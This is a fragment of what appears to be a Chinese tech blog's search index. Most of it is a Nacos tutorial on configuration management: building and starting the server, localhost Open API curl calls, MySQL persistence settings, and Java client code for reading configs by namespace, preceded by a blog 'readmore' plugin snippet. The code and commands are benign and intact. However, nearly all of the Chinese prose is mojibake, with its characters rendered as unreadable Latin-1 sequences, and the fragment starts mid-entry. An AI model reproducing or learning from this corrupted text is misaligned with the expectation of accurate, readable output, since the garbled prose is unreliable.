æ¨¡å—çš„ç‰ˆæœ¬ï¼Œå¯¼è‡´åç»­å› ä»£ç ä¸å…¼å®¹ï¼Œå‡ºç°å„ç§ç¼–è¯‘é”™è¯¯ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"é™æ€åšå®¢"},{title:"Nacos å…¥é—¨æ•™ç¨‹ - é…ç½®ç®¡ç†åŸºç¡€ç¯‡",url:"/posts/ab6959cb.html",text:'é…ç½®ä¸­å¿ƒä»‹ç»ä»€ä¹ˆæ˜¯é…ç½®ä¸­å¿ƒåœ¨é›†ä¸­å¼å¼€å‘æ—¶ä»£ï¼Œé…ç½®æ–‡ä»¶å·²ç»åŸºæœ¬è¶³å¤Ÿäº†ï¼Œå› ä¸ºé‚£æ—¶é…ç½®çš„ç®¡ç†é€šå¸¸ä¸ä¼šæˆä¸ºä¸€ä¸ªå¾ˆå¤§çš„é—®é¢˜ã€‚ä½†æ˜¯åœ¨äº’è”ç½‘æ—¶ä»£ï¼Œåº”ç”¨éƒ½æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œéƒ¨ç½²åœ¨ N å°æœåŠ¡å™¨ä¸Šï¼Œæƒ³è¦å»çº¿ä¸Šä¸€å°å°åœ°é‡å¯æœºå™¨è‚¯å®šä¸é è°±ï¼Œå¹¶ä¸”ç»´æŠ¤æˆæœ¬ä¹Ÿå¾ˆé«˜ï¼Œæ‰€ä»¥é…ç½®ä¸­å¿ƒåº”è¿è€Œç”Ÿã€‚é…ç½®ä¸­å¿ƒè¢«ç”¨ä½œé›†ä¸­ç®¡ç†ä¸åŒç¯å¢ƒï¼ˆDevã€Testã€Stageã€Prodï¼‰å’Œä¸åŒé›†ç¾¤é…ç½®ï¼Œä»¥åŠåœ¨ä¿®æ”¹é…ç½®åå°†å®æ—¶åŠ¨æ€æ¨é€åˆ°åº”ç”¨ä¸Šè¿›è¡Œåˆ·æ–°ã€‚é…ç½®ä¸­å¿ƒåº”å…·å¤‡çš„åŠŸèƒ½å¦‚ä¸‹ï¼š Open API ä¸šåŠ¡æ— å…³æ€§ é«˜å¯ç”¨é›†ç¾¤ é…ç½®ç”Ÿæ•ˆç›‘æ§ é…åˆç°åº¦ä¸æ›´æ–° ä¸€è‡´æ€§ K-V å­˜å‚¨ ç»Ÿä¸€é…ç½®å®æ—¶æ¨é€ é…ç½®å…¨å±€æ¢å¤ã€å¤‡ä»½ä¸å†å² ä¸»æµé…ç½®ä¸­å¿ƒå¯¹æ¯” Spring Cloud Configã€Netflix Archaiusã€Apolloã€Disconfï¼ˆå·²åœæ­¢ç»´æŠ¤ï¼‰ å¯¹æ¯”å›¾ä¸€ Spring Cloud Configã€Netflix Archaiusã€Apolloã€Disconfï¼ˆå·²åœæ­¢ç»´æŠ¤ï¼‰ å¯¹æ¯”å›¾äºŒ Nacos ç®€ä»‹Nacos æ¦‚è¿°Nacos æ˜¯æ„å»ºä»¥ â€œæœåŠ¡â€ ä¸ºä¸­å¿ƒçš„ç°ä»£åº”ç”¨æ¶æ„ (ä¾‹å¦‚å¾®æœåŠ¡èŒƒå¼ã€äº‘åŸç”ŸèŒƒå¼) çš„æœåŠ¡åŸºç¡€è®¾æ–½ï¼Œå¯ä»¥æ›´æ•æ·å’Œå®¹æ˜“åœ°æ„å»ºã€äº¤ä»˜å’Œç®¡ç†å¾®æœåŠ¡å¹³å°ã€‚Nacos æä¾›äº†ä¸€ç»„ç®€å•æ˜“ç”¨çš„ç‰¹æ€§é›†ï¼Œè‡´åŠ›äºå¿«é€Ÿå®ç°åŠ¨æ€æœåŠ¡å‘ç°ã€æœåŠ¡é…ç½®ã€æœåŠ¡å…ƒæ•°æ®åŠæµé‡ç®¡ç†ã€‚æ›´å¤šèµ„æ–™å¯å‚è€ƒï¼šNacos é¡¹ç›®ã€Nacos å®˜æ–¹ç¤ºä¾‹ä»£ç ã€Nacos å®˜ç½‘ã€Nacos å®˜æ–¹ä¸­æ–‡æ–‡æ¡£ Nacos åŠŸèƒ½åŠ¨æ€é…ç½®æœåŠ¡ åŠ¨æ€é…ç½®æœåŠ¡èƒ½å¤Ÿä»¥ä¸­å¿ƒåŒ–ã€å¤–éƒ¨åŒ–å’ŒåŠ¨æ€åŒ–çš„æ–¹å¼ç®¡ç†æ‰€æœ‰ç¯å¢ƒçš„é…ç½®ã€‚åŠ¨æ€é…ç½®æ¶ˆé™¤äº†é…ç½®å˜æ›´æ—¶é‡æ–°éƒ¨ç½²åº”ç”¨å’ŒæœåŠ¡çš„éœ€è¦ã€‚é…ç½®ä¸­å¿ƒåŒ–ç®¡ç†è®©å®ç°æ— çŠ¶æ€æœåŠ¡æ›´ç®€å•ï¼Œä¹Ÿè®©æŒ‰éœ€å¼¹æ€§æ‰©å±•æœåŠ¡æ›´å®¹æ˜“ã€‚ æœåŠ¡å‘ç°ä¸æœåŠ¡å¥åº·ç›‘æµ‹ åŠ¨æ€æœåŠ¡å‘ç°å¯¹ä»¥æœåŠ¡ä¸ºä¸­å¿ƒçš„ï¼ˆä¾‹å¦‚å¾®æœåŠ¡å’Œäº‘åŸç”Ÿï¼‰åº”ç”¨æ¶æ„æ–¹å¼éå¸¸å…³é”®ã€‚Nacos æ”¯æŒ DNS-Based å’Œ RPC-Basedï¼ˆDubboã€gRPCï¼‰ æ¨¡å¼çš„æœåŠ¡å‘ç°ã€‚Nacos ä¹Ÿæä¾›å®æ—¶å¥åº·æ£€æŸ¥ï¼Œä»¥é˜²æ­¢å°†è¯·æ±‚å‘å¾€ä¸å¥åº·çš„ä¸»æœºæˆ–æœåŠ¡å®ä¾‹ã€‚å€ŸåŠ© Nacosï¼Œå¯ä»¥æ›´å®¹æ˜“åœ°ä¸ºæœåŠ¡å®ç°æ–­è·¯å™¨ã€‚ åŠ¨æ€ DNS æœåŠ¡ é€šè¿‡æ”¯æŒæƒé‡è·¯ç”±ï¼ŒåŠ¨æ€ DNS æœåŠ¡èƒ½å¤Ÿè½»æ¾å®ç°ä¸­é—´å±‚è´Ÿè½½å‡è¡¡ã€æ›´çµæ´»çš„è·¯ç”±ç­–ç•¥ã€æµé‡æ§åˆ¶ä»¥åŠç®€å•æ•°æ®ä¸­å¿ƒå†…ç½‘çš„ç®€å• DNS è§£ææœåŠ¡ã€‚åŠ¨æ€ DNS æœåŠ¡è¿˜èƒ½æ›´å®¹æ˜“åœ°å®ç°ä»¥ DNS åè®®ä¸ºåŸºç¡€çš„æœåŠ¡å‘ç°ï¼Œä»¥æ¶ˆé™¤è€¦åˆåˆ°å‚å•†ç§æœ‰æœåŠ¡å‘ç° API ä¸Šçš„é£é™©ã€‚ æœåŠ¡åŠå…¶å…ƒæ•°æ®ç®¡ç† Nacos èƒ½ä»å¾®æœåŠ¡å¹³å°å»ºè®¾çš„è§†è§’ç®¡ç†æ•°æ®ä¸­å¿ƒçš„æ‰€æœ‰æœåŠ¡åŠå…ƒæ•°æ®ï¼ŒåŒ…æ‹¬ç®¡ç†æœåŠ¡çš„æè¿°ã€ç”Ÿå‘½å‘¨æœŸã€æœåŠ¡çš„é™æ€ä¾èµ–åˆ†æã€æœåŠ¡çš„å¥åº·çŠ¶æ€ã€æœåŠ¡çš„æµé‡ç®¡ç†ã€è·¯ç”±åŠå®‰å…¨ç­–ç•¥ã€æœåŠ¡çš„ SLA ä»¥åŠæœ€é¦–è¦çš„ metrics ç»Ÿè®¡æ•°æ®ã€‚ Nacos ç‰¹æ€§æ˜“äºä½¿ç”¨ åŠ¨æ€é…ç½®ç®¡ç†ã€æœåŠ¡å‘ç°å’ŒåŠ¨æ€çš„ä¸€ç«™å¼è§£å†³æ–¹æ¡ˆ 20 å¤šç§å¼€ç®±å³ç”¨çš„ä»¥æœåŠ¡ä¸ºä¸­å¿ƒçš„æ¶æ„ç‰¹æ€§ åŸºæœ¬ç¬¦åˆç”Ÿäº§è¦æ±‚çš„è½»é‡çº§æ˜“ç”¨æ§åˆ¶å° ç”Ÿäº§ç­‰çº§ è„±èƒäºå†ç»é˜¿é‡Œå·´å·´ 10 å¹´ç”Ÿäº§éªŒè¯çš„å†…éƒ¨äº§å“ æ”¯æŒå…·æœ‰æ•°ç™¾ä¸‡æœåŠ¡çš„å¤§è§„æ¨¡åœºæ™¯ å…·å¤‡ä¼ä¸šçº§ SLA çš„å¼€æºäº§å“ æ›´é€‚åº”äº‘æ¶æ„ æ— ç¼æ”¯æŒ Kubernetes å’Œ Spring Cloud åœ¨ä¸»æµå…¬å…±äº‘ä¸Šæ›´å®¹æ˜“éƒ¨ç½²å’Œè¿è¡Œï¼ˆä¾‹å¦‚é˜¿é‡Œäº‘å’Œ AWSï¼‰ å¤šç§Ÿæˆ·å’Œå¤šç¯å¢ƒæ”¯æŒ ä¸°å¯Œçš„åº”ç”¨åœºæ™¯ æ”¯æŒé™æµã€å¤§ä¿ƒé”€é¢„æ¡ˆå’Œå¼‚åœ°å¤šæ´» ç›´æ¥æ”¯æŒæˆ–ç¨ä½œæ‰©å±•å³å¯æ”¯æŒå¤§é‡æœ‰ç”¨çš„äº’è”ç½‘åº”ç”¨åœºæ™¯ æµé‡è°ƒåº¦å’ŒæœåŠ¡æ²»ç† Nacos ç”Ÿæ€å›¾å¦‚ Nacos ç”Ÿæ€å›¾æ‰€ç¤ºï¼ŒNacos æ— ç¼æ”¯æŒä¸€äº›ä¸»æµçš„å¼€æºç”Ÿæ€ï¼ŒåŒ…æ‹¬ Spring Cloudã€Apache Dubboã€Dubbo Meshã€gRPCã€Kubernetes ã€CNCF ç­‰ã€‚ Nacos å®‰è£…å®‰è£… Nacoså®‰è£…ç¯å¢ƒå‡†å¤‡Nacos ä¾èµ– Java ç¯å¢ƒè¿è¡Œï¼Œå› æ­¤éœ€è¦æå‰å®‰è£…å¹¶é…ç½® JDKï¼Œå¦‚æœæ˜¯ä»æºç å¼€å§‹æ„å»ºå¹¶è¿è¡Œ Nacosï¼Œè¿˜éœ€è¦ä¸ºæ­¤é…ç½® Maven ç¯å¢ƒï¼ŒNacos ä¾èµ–çš„è½¯ä»¶ç¯å¢ƒå¦‚ä¸‹ï¼š 64 Bit OSï¼Œæ”¯æŒ Unix/Linux/Mac/Windows 64 Bit JDK 1.8+ Maven 3.2.x+ Nacos 1.4.0 é€šè¿‡æºç ç¼–è¯‘å®‰è£…12345678910111213141516171819202122232425262728# æ‹‰å–æºç $ git clone git@github.com:alibaba/nacos.git# è¿›å…¥æºç ç›®å½•$ cd nacos# ç¼–è¯‘æ‰“åŒ…$ mvn -Prelease-nacos clean install -U# æˆ–è€…æŒ‡å®šç¼–è¯‘æ—¶è·³è¿‡æµ‹è¯•$ mvn -Prelease-nacos clean install -U -f pom.xml -Dmaven.test.skip=true# è¿›å…¥ç¼–è¯‘åçš„binç›®å½•$ cd distribution/target/nacos-server-1.4.0/nacos/bin# å•æœºæ¨¡å¼ä¸‹å¯åŠ¨NacosæœåŠ¡ï¼Œé»˜è®¤ç«¯å£ä¸º8848ï¼Œé»˜è®¤ä½¿ç”¨å†…ç½®æ•°æ®æº$ sh startup.sh -m standalone# æŸ¥çœ‹Nacosçš„è¿›ç¨‹çŠ¶æ€$ ps -aux|grep nacos# æŸ¥çœ‹Nacosçš„ç«¯å£çŠ¶æ€$ netstat -anp|grep 8848# å…³é—­NacosæœåŠ¡$ sh shutdown.sh# æç¤ºï¼š Nacoså¯åŠ¨çš„æ—¥å¿—æ–‡ä»¶è·¯å¾„ä¸ºï¼š nacos/distribution/target/nacos-server-1.4.0/nacos/logs/start.out é€šè¿‡ä¸‹è½½äºŒè¿›åˆ¶åŒ…å®‰è£…Nacos ä¸‹è½½åœ°å€ç‚¹è¿™é‡Œï¼Œä¸‹è½½åè§£å‹å³å¯è¿è¡Œã€‚ 12345678910111213141516171819# è§£å‹$ tar -xvf nacos-server-1.4.0.tar.gz# è¿›å…¥binç›®å½•$ cd nacos/bin# å•æœºæ¨¡å¼ä¸‹å¯åŠ¨NacosæœåŠ¡ï¼Œé»˜è®¤ç«¯å£ä¸º8848ï¼Œé»˜è®¤ä½¿ç”¨å†…ç½®æ•°æ®æº$ sh startup.sh -m standalone# æŸ¥çœ‹Nacosçš„è¿›ç¨‹çŠ¶æ€$ ps -aux|grep nacos# æŸ¥çœ‹Nacosçš„ç«¯å£çŠ¶æ€$ netstat -anp|grep 8848# å…³é—­NacosæœåŠ¡$ sh shutdown.sh# æç¤ºï¼š Nacoså¯åŠ¨çš„æ—¥å¿—æ–‡ä»¶è·¯å¾„ä¸ºï¼š nacos/logs/start.out è®¿é—® Nacos çš„ Web æ§åˆ¶å°æµè§ˆå™¨è®¿é—® http://127.0.0.1:8848/nacosï¼Œé»˜è®¤ç™»å½•çš„ç”¨æˆ·åå’Œå¯†ç ä¸º nacos/nacosã€‚ Open API é…ç½®ç®¡ç†æµ‹è¯•Nacos å¯åŠ¨æˆåŠŸåï¼Œå¯é€šè¿‡ Nacos æä¾›çš„ HTTP API éªŒè¯ Nacos æœåŠ¡è¿è¡Œæ˜¯å¦æ­£å¸¸ã€‚ 123# æ–°å¢é…ç½®ä¿¡æ¯åˆ°Nacos$ curl -X POST "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test&amp;content=HelloWorld"true åˆ·æ–° Nacos çš„ Web æ§åˆ¶å°ï¼Œå¯ä»¥çœ‹åˆ°åˆšæ–°å¢çš„é…ç½®ä¿¡æ¯å¦‚ä¸‹ï¼š 123# ä»Nacosè·å–é…ç½®ä¿¡æ¯$ curl -X GET "http://127.0.0.1:8848/nacos/v1/cs/configs?dataId=nacos.cfg.dataId&amp;group=test"HelloWorld å¤–éƒ¨ MySQL æ•°æ®åº“æ”¯æŒï¼ˆæŒä¹…åŒ–é…ç½®ï¼‰å•æœºæ¨¡å¼ä¸‹ Nacos é»˜è®¤ä½¿ç”¨åµŒå…¥å¼æ•°æ®åº“ derby æ¥å­˜å‚¨æ•°æ®ï¼Œè‹¥æƒ³ä½¿ç”¨å¤–éƒ¨ MySQL æ•°æ®åº“å­˜å‚¨ Nacos çš„æ•°æ®ï¼Œéœ€è¦è¿›è¡Œä»¥ä¸‹æ“ä½œï¼š å®‰è£… MySQL 5.6.5+ ä¸‹è½½ Nacos Server çš„äºŒè¿›åˆ¶å®‰è£…åŒ…å¹¶è§£å‹ åˆ›å»ºæ•°æ®åº“ nacos_configï¼Œæ‰§è¡Œ SQL åˆå§‹åŒ–è„šæœ¬ï¼Œæ•°æ®åº“åˆå§‹åŒ–è„šæœ¬çš„è·¯å¾„ä¸ºï¼š${nacos-home}/conf/nacos-mysql.sql 12345678910111213141516171819202122232425262728# åˆ›å»ºæ•°æ®åº“mysql&gt; create database nacos_config default character set utf8;# åˆ‡æ¢æ•°æ®åº“mysql&gt; use nacos_config;# æ‰§è¡ŒSQLåˆå§‹åŒ–è„šæœ¬mysql&gt; source ${nacos-home}/conf/nacos-mysql.sql;# æŸ¥çœ‹æ•°æ®åº“è¡¨mysql&gt; show tables;+------------------------+| Tables_in_nacos_config |+------------------------+| config_info || config_info_aggr || config_info_beta || config_info_tag || config_tags_relation || group_capacity || his_config_info || permissions || roles || tenant_capacity || tenant_info || users |+------------------------+12 rows in set (0.00 sec) ä¿®æ”¹ ${nacos-home}/conf/application.properties é…ç½®æ–‡ä»¶ï¼Œå¢åŠ æ”¯æŒ MySQL æ•°æ®æºçš„é…ç½®ä¿¡æ¯ï¼ˆç›®å‰åªæ”¯æŒ MySQLï¼‰ï¼Œå¹¶æ·»åŠ  MySQL æ•°æ®åº“çš„ URLã€ç”¨æˆ·åã€å¯†ç ï¼Œæœ€åé‡æ–°å¯åŠ¨ Nacos æœåŠ¡å³å¯ï¼Œé…ç½®ç¤ºä¾‹å¦‚ä¸‹ï¼š 123456spring.datasource.platform=mysqldb.num=1db.url.0=jdbc:mysql://127.0.0.1:3306/nacos_config?characterEncoding=utf8&amp;connectTimeout=1000&amp;socketTimeout=3000&amp;autoReconnect=true&amp;useUnicode=true&amp;useSSL=false&amp;serverTimezone=UTCdb.user=rootdb.password=123456 è‹¥å¸Œæœ›ä½¿ç”¨ Nacos Server å†…ç½®çš„æ•°æ®æºï¼ˆåµŒå…¥å¼æ•°æ®åº“ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨ -p embedded å‚æ•°æ¥å¯åŠ¨ Nacos Server 1sh startup.sh -p embedded Nacos é…ç½®å…¥é—¨æ¡ˆä¾‹ç¬¬ä¸€æ­¥ï¼šç‚¹å‡»æ–°å¢é…ç½®æŒ‰é’®æµè§ˆå™¨è®¿é—® http://127.0.0.1:8848/nacosï¼Œæ‰“å¼€ Nacos çš„ Web æ§åˆ¶å°ï¼Œå¹¶æ‰¾åˆ°èœå• é…ç½®ç®¡ç† &gt; é…ç½®åˆ—è¡¨ï¼Œç„¶åç‚¹å‡» æ–°å¢ æŒ‰é’®ï¼š ç¬¬äºŒæ­¥ï¼šæ–°å¢é…ç½®ä¿¡æ¯åœ¨æ–°å¢é…ç½®ä¿¡æ¯çš„è¡¨å•é‡Œï¼Œå¡«å†™å¦‚ä¸‹çš„å†…å®¹ï¼Œç„¶åç‚¹å‡» å‘å¸ƒ æŒ‰é’®å³å¯ã€‚ç‰¹åˆ«æ³¨æ„çš„æ˜¯ï¼ŒDataId é»˜è®¤æ˜¯ä»¥ properties ä½œä¸ºé»˜è®¤çš„æ–‡ä»¶æ‰©å±•åã€‚ ç¬¬ä¸‰æ­¥ï¼šæŸ¥è¯¢é…ç½®ä¿¡æ¯ ç¬¬å››æ­¥ï¼šè°ƒç”¨ Java API è·å– Nacos çš„é…ç½®ä¿¡æ¯12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-client&lt;/artifactId&gt; &lt;version&gt;1.4.0&lt;/version&gt;&lt;/dependency&gt; 1234567891011121314151617181920212223import com.alibaba.nacos.api.NacosFactory;import com.alibaba.nacos.api.config.ConfigService;import com.alibaba.nacos.api.exception.NacosException;import java.util.Properties;/** * ä»Nacosè¯»å–é…ç½®ä¿¡æ¯ * @author clay */public class NacosDemoApplicaton { public static void main(String[] args) throws NacosException { String serverAddr = "127.0.0.1:8848"; String dataId = "nacos_simple_demo.yaml"; String group = "DEFAULT_GROUP"; Properties properties = new Properties(); properties.put("serverAddr", serverAddr); ConfigService configService = NacosFactory.createConfigService(properties); String content = configService.getConfig(dataId, group, 1000); System.out.println(content); }} ç¨‹åºè¿è¡Œè¾“å‡ºç»“æœå¦‚ä¸‹ï¼š 12common: config: something Nacos é…ç½®ç®¡ç†åŸºç¡€Nacos é…ç½®ç®¡ç†æ¨¡å‹å¯¹äº Nacos é…ç½®ç®¡ç†ï¼Œé€šè¿‡ Namespaceã€groupã€Data ID èƒ½å¤Ÿå®šä½åˆ°ä¸€ä¸ªé…ç½®é›†ã€‚ é…ç½®é¡¹ é…ç½®é›†ä¸­åŒ…å«çš„ä¸€ä¸ªä¸ªé…ç½®å†…å®¹å°±æ˜¯é…ç½®é¡¹ã€‚å®ƒä»£è¡¨ä¸€ä¸ªå…·ä½“çš„å¯é…ç½®çš„å‚æ•°ä¸å…¶å€¼åŸŸï¼Œé€šå¸¸ä»¥ key=value çš„å½¢å¼å­˜åœ¨ã€‚ä¾‹å¦‚ç»å¸¸é…ç½®ç³»ç»Ÿçš„æ—¥å¿—è¾“å‡ºçº§åˆ«ï¼ˆlogLevel=INFO|WARN|ERRORï¼‰ å°±æ˜¯ä¸€ä¸ªé…ç½®é¡¹ã€‚ é…ç½®é›†ï¼ˆData IDï¼‰ åœ¨ç³»ç»Ÿä¸­ï¼Œä¸€ä¸ªé…ç½®æ–‡ä»¶é€šå¸¸å°±æ˜¯ä¸€ä¸ªé…ç½®é›†ï¼Œä¸€ä¸ªé…ç½®é›†å¯ä»¥åŒ…å«äº†ç³»ç»Ÿçš„å„ç§é…ç½®ä¿¡æ¯ï¼Œä¾‹å¦‚ä¸€ä¸ªé…ç½®é›†å¯èƒ½åŒ…å«äº†æ•°æ®æºã€çº¿ç¨‹æ± ã€æ—¥å¿—çº§åˆ«ç­‰é…ç½®é¡¹ã€‚æ¯ä¸ªé…ç½®é›†éƒ½å¯ä»¥å®šä¹‰ä¸€ä¸ªæœ‰æ„ä¹‰çš„åç§°ï¼Œå°±æ˜¯é…ç½®é›†çš„ IDï¼Œå³ Data IDã€‚ é…ç½®åˆ†ç»„ï¼ˆGroupï¼‰ é…ç½®åˆ†ç»„æ˜¯å¯¹é…ç½®é›†è¿›è¡Œåˆ†ç»„ï¼Œé€šè¿‡ä¸€ä¸ªæœ‰æ„ä¹‰çš„å­—ç¬¦ä¸²ï¼ˆå¦‚ Buy æˆ– Trade ï¼‰æ¥è¡¨ç¤ºï¼Œä¸åŒçš„é…ç½®åˆ†ç»„ä¸‹å¯ä»¥æœ‰ç›¸åŒçš„é…ç½®é›†ï¼ˆData IDï¼‰ã€‚å½“åœ¨ Nacos ä¸Šåˆ›å»ºä¸€ä¸ªé…ç½®æ—¶ï¼Œå¦‚æœæœªå¡«å†™é…ç½®åˆ†ç»„çš„åç§°ï¼Œåˆ™é…ç½®åˆ†ç»„çš„åç§°é»˜è®¤é‡‡ç”¨ DEFAULT_GROUPã€‚é…ç½®åˆ†ç»„çš„å¸¸è§åœºæ™¯ï¼šå¯ç”¨äºåŒºåˆ†ä¸åŒçš„é¡¹ç›®æˆ–åº”ç”¨ï¼Œä¾‹å¦‚ï¼šå­¦ç”Ÿç®¡ç†ç³»ç»Ÿçš„é…ç½®é›†å¯ä»¥å®šä¹‰ä¸€ä¸ª Group ä¸ºï¼šSTUDENT_GROUPã€‚ å‘½åç©ºé—´ï¼ˆNamespaceï¼‰ å‘½åç©ºé—´å¯ç”¨äºè¿›è¡Œä¸åŒç¯å¢ƒçš„é…ç½®éš”ç¦»ã€‚ä¾‹å¦‚å¯ä»¥éš”ç¦»å¼€å‘ç¯å¢ƒã€æµ‹è¯•ç¯å¢ƒå’Œç”Ÿäº§ç¯å¢ƒï¼Œå› ä¸ºå®ƒä»¬çš„é…ç½®å¯èƒ½å„ä¸ç›¸åŒï¼Œæˆ–è€…æ˜¯éš”ç¦»ä¸åŒçš„ç”¨æˆ·ï¼Œä¸åŒçš„å¼€å‘äººå‘˜ä½¿ç”¨åŒä¸€ä¸ª Nacos ç®¡ç†å„è‡ªçš„é…ç½®ï¼Œå¯é€šè¿‡ Namespace éš”ç¦»ã€‚å½“åœ¨ Nacos ä¸Šåˆ›å»ºä¸€ä¸ªé…ç½®æ—¶ï¼Œå¦‚æœæœªå¡«å†™å‘½åç©ºé—´çš„åç§°ï¼Œåˆ™å‘½åç©ºé—´çš„åç§°é»˜è®¤ä¸º publicã€‚ä¸åŒçš„å‘½åç©ºé—´ä¸‹ï¼Œå¯ä»¥å­˜åœ¨ç›¸åŒåç§°çš„é…ç½®åˆ†ç»„ï¼ˆGroupï¼‰ æˆ– é…ç½®é›†ã€‚ æœ€ä½³å®è·µ Nacos æŠ½è±¡å®šä¹‰äº† Namespaceã€Groupã€Data ID çš„æ¦‚å¿µï¼Œå…·ä½“è¿™å‡ ä¸ªæ¦‚å¿µä»£è¡¨ä»€ä¹ˆï¼Œå–å†³äºæŠŠå®ƒä»¬çœ‹æˆä»€ä¹ˆï¼Œè¿™é‡Œæ¨èä¸€ç§ç”¨æ³•ï¼Œå¦‚ä¸‹å›¾ï¼š Namespace ï¼šä»£è¡¨ä¸åŒç¯å¢ƒï¼Œå¦‚å¼€å‘ã€æµ‹è¯•ã€ç”Ÿäº§ç¯å¢ƒ Groupï¼šä»£è¡¨æŸé¡¹ç›®ï¼Œå¦‚ XX åŒ»ç–—é¡¹ç›®ã€XX ç”µå•†é¡¹ç›®ã€XX æ ¡å›­é¡¹ç›® DataIdï¼šæ¯ä¸ªé¡¹ç›®ä¸‹å¾€å¾€æœ‰è‹¥å¹²ä¸ªå·¥ç¨‹ï¼Œæ¯ä¸ªé…ç½®é›†ï¼ˆDataIdï¼‰æ˜¯ä¸€ä¸ªå·¥ç¨‹çš„ä¸»é…ç½®æ–‡ä»¶ Nacos å‘½åç©ºé—´ç®¡ç†Namespace éš”ç¦»è®¾è®¡ Namespace çš„è®¾è®¡æ˜¯ Nacos åŸºäºæ­¤åšå¤šç¯å¢ƒä»¥åŠå¤šç§Ÿæˆ·ï¼ˆå¤šä¸ªç”¨æˆ·å…±åŒä½¿ç”¨ Nacosï¼‰æ•°æ®ï¼ˆé…ç½®å’ŒæœåŠ¡ï¼‰éš”ç¦»çš„ã€‚ä»ä¸€ä¸ªç§Ÿæˆ· (ç”¨æˆ·ï¼‰çš„è§’åº¦æ¥çœ‹ï¼Œå¦‚æœæœ‰å¤šå¥—ä¸åŒçš„ç¯å¢ƒï¼Œé‚£ä¹ˆè¿™ä¸ªæ—¶å€™å¯ä»¥æ ¹æ®æŒ‡å®šçš„ç¯å¢ƒæ¥åˆ›å»ºä¸åŒçš„ Namespaceï¼Œä»¥æ­¤æ¥å®ç°å¤šç¯å¢ƒçš„éš”ç¦»ã€‚ä¾‹å¦‚å¯èƒ½æœ‰å¼€å‘ã€æµ‹è¯•å’Œç”Ÿäº§ä¸‰ä¸ªä¸åŒçš„ç¯å¢ƒï¼Œé‚£ä¹ˆä½¿ç”¨ä¸€å¥— Nacos é›†ç¾¤å¯ä»¥åˆ†åˆ«å»ºä»¥ä¸‹ä¸‰ä¸ªä¸åŒçš„ Namespaceï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºï¼š ä»å¤šä¸ªç§Ÿæˆ·ï¼ˆç”¨æˆ·ï¼‰çš„è§’åº¦æ¥çœ‹ï¼Œæ¯ä¸ªç§Ÿæˆ·ï¼ˆç”¨æˆ·ï¼‰å¯èƒ½ä¼šæœ‰è‡ªå·±çš„ Namespaceï¼Œæ¯ä¸ªç§Ÿæˆ·ï¼ˆç”¨æˆ·ï¼‰çš„é…ç½®æ•°æ®ä»¥åŠæ³¨å†Œçš„æœåŠ¡æ•°æ®éƒ½ä¼šå½’å±åˆ°è‡ªå·±çš„ Namespace ä¸‹ï¼Œä»¥æ­¤æ¥å®ç°å¤šç§Ÿæˆ·é—´çš„æ•°æ®éš”ç¦»ã€‚ä¾‹å¦‚è¶…çº§ç®¡ç†å‘˜åˆ†é…äº†ä¸‰ä¸ªç§Ÿæˆ·ï¼ˆç”¨æˆ·ï¼‰ï¼Œåˆ†åˆ«ä¸ºå¼ ä¸‰ã€æå››å’Œç‹äº”ã€‚åˆ†é…å¥½äº†ä¹‹åï¼Œå„ç§Ÿæˆ·ç”¨è‡ªå·±çš„è´¦æˆ·åå’Œå¯†ç ç™»å½•åï¼Œåˆ›å»ºè‡ªå·±çš„å‘½åç©ºé—´ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š Nacos åˆ›å»ºå‘½åç©ºé—´ ç¬¬ä¸€æ­¥ï¼šèœå•æ é€‰ä¸­å‘½åç©ºé—´ï¼Œç„¶åç‚¹å‡»é¡µé¢ä¸Šçš„æ–°å»ºå‘½åç©ºé—´æŒ‰é’® ç¬¬äºŒæ­¥ï¼šåœ¨è¡¨å•å†…å¡«å†™å¿…è¦çš„å‘½åç©ºé—´ä¿¡æ¯ï¼Œç„¶åç‚¹å‡»ç¡®å®šæŒ‰é’®æäº¤ ç¬¬ä¸‰æ­¥ï¼šèœå•æ é€‰ä¸­é…ç½®ç®¡ç† &gt; é…ç½®åˆ—è¡¨ï¼Œå¯ä»¥é€šè¿‡ Tab æŒ‰é’®åˆ‡æ¢åˆ°ä¸åŒçš„å‘½åç©ºé—´ï¼Œæ¥ç€å°±å¯ä»¥åœ¨å¯¹åº”çš„å‘½åç©ºé—´ä¸‹æ–°å¢é…ç½®ä¿¡æ¯ ä»£ç ç¤ºä¾‹ 12345&lt;dependency&gt; &lt;groupId&gt;com.alibaba.nacos&lt;/groupId&gt; &lt;artifactId&gt;nacos-client&lt;/artifactId&gt; &lt;version&gt;1.4.0&lt;/version&gt;&lt;/dependency&gt; 12345678910111213141516171819202122232425import com.alibaba.nacos.api.NacosFactory;import com.alibaba.nacos.api.config.ConfigService;import com.alibaba.nacos.api.exception.NacosException;import java.util.Properties;/** * ä»Nacosè¯»å–ç‰¹å®šå‘½åç©ºé—´ä¸‹çš„é…ç½®ä¿¡æ¯ * @author clay */public class NacosDemoApplicaton { public static void main(String[] args) throws NacosException { String serverAddr = "127.0.0.1:8848"; String namespace = "7ec71a71-6ee5-4f87-a387-0d29d9e8fe51"; String group = "DEFAULT_GROUP"; String dataId = "nacos_simple_demo.yaml"; Properties properties = new Properties(); properties.put("serverAddr", serverAddr); properties.put("namespace", namespace); ConfigService configService = NacosFactory.createConfigService(properties); String content = configService.getConfig(dataId, group, 1000); System.out.println(content); }} Nacos 